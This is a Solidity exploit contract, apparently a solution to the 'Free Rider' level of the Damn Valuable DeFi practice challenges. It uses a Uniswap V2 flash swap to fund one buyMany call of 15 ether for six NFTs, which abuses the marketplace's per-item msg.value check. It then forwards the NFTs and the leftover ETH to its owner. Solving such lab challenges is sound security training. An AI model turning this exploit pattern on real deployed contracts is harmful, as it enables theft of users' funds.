// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";
import "forge-std/Test.sol";

contract FreeRiderAttacker is IERC721Receiver {
    address public immutable owner;
    IUniswapV2Pair public immutable uinswapV2Pair;
    IUniswapV2Factory public immutable uniswapV2Factory;
    WETH9 public immutable weth;
    uint8 internal constant AMOUNT_OF_NFTS = 6;

    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableNFT internal damnValuableNFT;
    FreeRiderBuyer internal freeRiderBuyer;

    constructor(
        address _owner,
        address _uinswapV2Pair,
        address _factory,
        address _weth,
        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,
        FreeRiderBuyer _freeRiderBuyer
    ) {
        owner = _owner;
        uinswapV2Pair = IUniswapV2Pair(_uinswapV2Pair);
        uniswapV2Factory = IUniswapV2Factory(_factory);
        weth = WETH9(payable(_weth));

        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
        damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());
        freeRiderBuyer = _freeRiderBuyer;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == uniswapV2Factory.getPair(token0, token1)); // ensure that msg.sender is a V2 pair
            // rest of the function goes here!
        uint256 amount = weth.balanceOf(address(this));
        console.log(amount);

        weth.withdraw(amount1);

        uint256[] memory NFTsToBuy = new uint256[](6);

        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
            NFTsToBuy[i] = i;
            unchecked {
                ++i;
            }
        }

        freeRiderNFTMarketplace.buyMany{value: 15 ether}(NFTsToBuy);

        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            damnValuableNFT.safeTransferFrom(address(this), owner, tokenId);
        }

        //weth.withdraw(amount);
        uint256 returnedAmunt = amount1 * 1003 / 997;
        weth.deposit{value: returnedAmunt}();
        weth.transfer(msg.sender, returnedAmunt);
    }

    function flashLoan(uint256 amount) public {
        uinswapV2Pair.swap(0, amount, address(this), abi.encode(amount));

        console.log("amount is", address(this).balance);
        (bool sucess,) = owner.call{value: address(this).balance}("");
        require(sucess, "call failed");
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
